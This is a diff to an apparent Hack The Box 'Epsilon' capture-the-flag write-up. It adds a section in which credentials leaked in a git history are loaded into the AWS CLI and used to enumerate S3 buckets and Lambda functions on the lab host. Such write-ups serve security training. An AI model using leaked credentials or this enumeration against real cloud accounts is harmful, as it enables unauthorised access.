@@ -272,7 +272,7 @@ aws_lambda = session.client('lambda')
 
 <br />
 
-Most of the important information, such as the aws credentials, is removed.
+Most of the important information, such as the `AWS` credentials, is removed.
 
 We can only take note of the `cloud.epsilon.htb` subdomain and add it to our `/etc/hosts` file.
 
@@ -284,7 +284,7 @@ We can only take note of the `cloud.epsilon.htb` subdomain and add it to our `/e
 
 At this point, we can analyze the past commits of the dumped repository trying to find some information leakage.
 
-The `git log` command shows 4 differents commits:
+The `git log` command shows 4 different commits:
 
 <br />
 
@@ -318,7 +318,7 @@ Date:   Wed Nov 17 10:00:28 2021 +0000
 
 <br />
 
-Let's go with the last one:
+Let's inspect the first commit added to the repository:
 
 <br />
 
@@ -368,12 +368,106 @@ We can set them using the `aws configure` command to interact with `cloud.epsilo
 
 <br />
 
+### AWS Enumeration:
+
+<br />
+
 ```bash 
 ❯ aws configure
 AWS Access Key ID [****************test]: AQLA5M37BDN6FJP76TDC
 AWS Secret Access Key [****************test]: OsK0o/glWwcjk2U3vVEowkvq5t4EiIreB+WdFo1A
 Default region name [us-east-1]:        
 Default output format [test]: json
+```
+
+<br />
+
+The first thing we try is to enumerate AWS buckets.
+
+<br />
+
+```bash 
+❯ aws s3 ls s3:// --endpoint-url http://cloud.epsilon.htb
+
+An error occurred (400) when calling the ListBuckets operation: Bad Request
+```
+
+<br />
+
+Unfortunately, the request returned a `400 Bad Request` error.
+
+If we recall, there was something related to `lambda` in the `track_api_CR_148.py` source code.
+
+Running `aws help` we can see that it's a lambda option in the output, and if we run a `aws lambda help` we see an interesting flag, `list-functions`, which enumerates available Lambda functions:
+
+<br />
+
+```bash 
+❯ aws lambda list-functions --endpoint-url http://cloud.epsilon.htb
+{
+    "Functions": [
+        {
+            "FunctionName": "costume_shop_v1",
+            "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:costume_shop_v1",
+            "Runtime": "python3.7",
+            "Role": "arn:aws:iam::123456789012:role/service-role/dev",
+            "Handler": "my-function.handler",
+            "CodeSize": 478,
+            "Description": "",
+            "Timeout": 3,
+            "LastModified": "2025-05-24T10:30:13.205+0000",
+            "CodeSha256": "IoEBWYw6Ka2HfSTEAYEOSnERX7pq0IIVH5eHBBXEeSw=",
+            "Version": "$LATEST",
+            "VpcConfig": {},
+            "TracingConfig": {
+                "Mode": "PassThrough"
+            },
+            "RevisionId": "436a4229-7c8b-4584-85a0-63bbcb657b2f",
+            "State": "Active",
+            "LastUpdateStatus": "Successful",
+            "PackageType": "Zip"
+        }
+    ]
+}
+```
+
+<br />
+
+One available function is named `"costume_shop_v1"`.
+
+Using `get-function` along with the `--function-name` option, we can retrieve more detailed information about it:
+
+<br />
+
+```bash
+❯ aws lambda get-function --function-name=costume_shop_v1 --endpoint-url http://cloud.epsilon.htb
+{
+    "Configuration": {
+        "FunctionName": "costume_shop_v1",
+        "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:costume_shop_v1",
+        "Runtime": "python3.7",
+        "Role": "arn:aws:iam::123456789012:role/service-role/dev",
+        "Handler": "my-function.handler",
+        "CodeSize": 478,
+        "Description": "",
+        "Timeout": 3,
+        "LastModified": "2025-05-24T10:30:13.205+0000",
+        "CodeSha256": "IoEBWYw6Ka2HfSTEAYEOSnERX7pq0IIVH5eHBBXEeSw=",
+        "Version": "$LATEST",
+        "VpcConfig": {},
+        "TracingConfig": {
+            "Mode": "PassThrough"
+        },
+        "RevisionId": "436a4229-7c8b-4584-85a0-63bbcb657b2f",
+        "State": "Active",
+        "LastUpdateStatus": "Successful",
+        "PackageType": "Zip"
+    },
+    "Code": {
+        "Location": "http://cloud.epsilon.htb/2015-03-31/functions/costume_shop_v1/code"
+    },
+    "Tags": {}
+}
 ```
 
 <br />
